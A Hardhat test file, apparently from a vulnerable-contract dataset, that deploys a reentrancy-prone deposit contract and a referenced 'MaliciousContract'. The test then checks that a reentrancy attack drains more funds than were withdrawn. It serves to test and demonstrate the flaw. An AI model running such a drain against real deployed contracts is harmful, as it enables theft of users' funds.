const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const fs = require("fs");
describe("Reentrancy Attack for 0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1.sol", function () {
  let ACCURAL_DEPOSIT;
  let victim;
  let MaliciousContract;
  let hacker;
  let Log;
  let log;

  beforeEach(async function () {
    // Deploy Log contract
    const logPath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/reentrancy/0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1.sol/LogFile.json",
    );
    const logJson = JSON.parse(fs.readFileSync(logPath));
    Log = await ethers.getContractFactory(logJson.abi, logJson.bytecode);
    log = await Log.deploy();
    await log.waitForDeployment();

    // Deploy ACCURAL_DEPOSIT contract with Log address
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/reentrancy/0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1.sol/ACCURAL_DEPOSIT.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    ACCURAL_DEPOSIT = await ethers.getContractFactory(json.abi, json.bytecode);
    victim = await ACCURAL_DEPOSIT.deploy();
    await victim.waitForDeployment();
    victim.SetLogFile(log.target); // Set Log address on constructor

    // Deploy MaliciousContract with ACCURAL_DEPOSIT address
    MaliciousContract = await ethers.getContractFactory(
      "contracts/reentrancy/0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1_attack.sol:MaliciousContract",
    );
    hacker = await MaliciousContract.deploy(victim.target);
  });

  it("sanity check: reentrancy/0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1.sol", async function () {
    await expect(victim.Deposit({ value: ethers.parseEther("10") })).to.not.be
      .reverted;
    expect(await ethers.provider.getBalance(victim.target)).to.equal(
      ethers.parseEther("10"),
    );
    await expect(victim.Collect(ethers.parseEther("10"))).to.not.be.reverted;
    expect(await ethers.provider.getBalance(victim.target)).to.equal(0);
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to victim contract
    await victim.Deposit({ value: ethers.parseEther("5") });

    const victimInitialBalance = await ethers.provider.getBalance(
      victim.target,
    );
    expect(victimInitialBalance).to.equal(ethers.parseEther("5"));

    // Initial deposit from maliciousContract on victim contract
    await hacker.deposit({ value: ethers.parseEther("5") });

    const victimBalanceAfterDeposit = await ethers.provider.getBalance(
      victim.target,
    );
    expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("10"));

    // Set hacker balance to 0
    await network.provider.send("hardhat_setBalance", [hacker.target, "0x0"]);
    let hackerBalance = await ethers.provider.getBalance(hacker.target);
    expect(hackerBalance).to.equal(0);

    // Perform reentrancy attack through MaliciousContract
    await hacker.attack(ethers.parseEther("3"));

    // Check balances after attack
    const victimBalance = await ethers.provider.getBalance(victim.target);
    const maliciousContractBalance = await ethers.provider.getBalance(
      hacker.target,
    );

    // Verify the attack was successful

    // victim has lost more funds than the withdrawal
    expect(victimBalance).to.be.below(ethers.parseEther("7"));

    // hacker has more than the withdrawal
    expect(maliciousContractBalance).to.be.above(ethers.parseEther("3"));
  });
});
